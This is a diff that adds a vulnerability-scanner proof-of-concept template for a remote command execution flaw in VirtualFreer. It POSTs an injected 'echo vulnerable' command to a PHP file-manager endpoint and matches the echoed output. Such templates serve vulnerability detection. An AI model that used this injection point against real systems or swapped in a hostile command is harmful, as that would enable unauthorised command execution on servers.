@@ -1,0 +1,13 @@
+name: poc-yaml-virtualfreer-rce
+rules:
+  - method: POST
+    path: "/Public/js/php/file_manager_json.php"
+    body: >-
+      a74ad8dfacd4f985eb3977517615ce25=echo vulnerable
+    expression: |
+      response.status==200 && response.body.bcontains(b'vulnerable')
+
+detail:
+  author: xiaoming
+  links:
+    - https://www.exploit-db.com/exploits/48094
